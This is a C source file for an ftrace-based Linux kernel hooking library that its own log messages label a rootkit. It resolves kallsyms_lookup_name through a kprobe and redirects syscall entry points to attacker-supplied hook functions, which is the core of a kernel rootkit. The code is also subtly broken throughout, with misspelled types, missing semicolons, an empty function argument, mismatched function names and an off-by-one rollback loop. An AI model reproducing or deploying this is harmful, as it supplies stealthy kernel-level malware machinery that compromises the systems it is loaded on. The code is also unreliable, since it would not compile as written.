/*
 * Alfred is a Helper library for ftrace hooking kernel functions inspired by the one and only xcellerator
 * Author: 0x4p0ll0
 * License: GPL
 * */




#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/module.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* x64 has to be special and require a different naming convention */
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = SYSCALL_NAME(_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* to prevent recursion inside the hook we need to implement a security mesure: Hook → detect recursion using return address → call original safely*/
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET 
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};



static int resolve_hook_address(struct ftrace_hook *hook)
{
  #if LINUX_VERSION_CODE >+ KERNEL_VERSION(5,7,0)
    static struct kprobe kp ={
      .symbol_name ="kallsyms_lookup_name"
    };
    typedef uninsigned long (*kallsyms_lookup_name_t)(const char* name);
    static kallsyms_lookup_name_t my_kallsyms_lookup_name =NULL;
    if (my_kallsyms_lookup_name==NULL){
      register_kprobe(&kp);
      my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
      unregister_kprobe(&kp);
    }
    if (my_kallsyms_lookup_name==NULL) {
      printk(KERN_DEBUG"rootkit: kall_syms_lookup_name not found via kprobes\n");
      return -ENOENT;
    }
    hook->address = my_kallsyms_lookup_name(hook->name);
  #else
    hook->address=kallsyms_lookup_name(hook->name);
  #endif
  if (!hook->address) {
        pr_debug("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

  #if USE_FENTRY_OFFSET
    *((uninsigned long*)) hook->original =hook->address +MCOUNT_INSN_SIZE;
  #else 
    *((uninsigned long*)) hook->original =hook->address;
  #endif
  return 0;
}

static void notrace fh_trace_thunk(unsigned long ip, unsigned long parent_ip,struct ftrace_ops *ops,struct ftrace_regs *fregs){
  struct ftrace_hook* hook= container_of(ops,struct ftrace_ops , ops)
  struct pt_regs *regs = ftrace_get_regs(fregs);
  if (!regs) {
    printk(KERN_DEBUG"Problem with ftrace_get_regs");
    return;
  }
  #if USE_FENTRY_OFFSET
    regs->ip = (unsigned long)hook->function;
  #else
        if (!within_module(parent_ip, THIS_MODULE)) {
            regs->ip = (unsigned long)hook->function;
        }
  #endif
}

static int install_hook (struct ftrace_hook* hook){
  int error;
  error =resolve_hook_address(hook);
  if (error){
    return error;
  }
  hook->ops.func=ftrace_thunk;
  hook->ops.flag=FTRACE_OPS_FL_SAVE_REGS //save cpu regs
                    | FTRACE_OPS_FL_RECURSION //enable recursion handling
                    | FTRACE_OPS_FL_IPMODIFY;
  error=ftrace_set_filter_ip(&hook->ops,  ,hook->address,0,0);
  if (error) {
    printk(KERN_DEBUG"ROOTKIT:register_set_filter_ip() failed %d\n",error);
    return error;
  }
  error=register_ftrace_function(&hook->ops);
  if (error) {
    printk(KERN_DEBUG"ROOTKIT:register_ftrace_function() failed :%d\n",error);
    return error;
    
  }
  return 0;
}

void remove_hook(struct ftrace_hook *hook){
  int error;
  error=unregister_ftrace_function(&hook->ops);
  if (error) {
    printk(KERN_DEBUG"ROOTKIT:unregister_ftrace_function() failed : %d\n",error);
  }
  error = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (error) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", error);
    }
}

int install_hooks(struct ftrace_hook *hooks,size_t count){
  int error;
  size_t i;
  for (i=0;i<count;i++){
    error=install_hook(&hooks[i]);
    if (error) {
      goto process_error
    }
  }
  return 0;
  process_error:
    while (i!=0){
      remove_hook(&hooks[i--]);
    }
    return error;
}

void remove_hooks(struct ftrace_hook* hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}




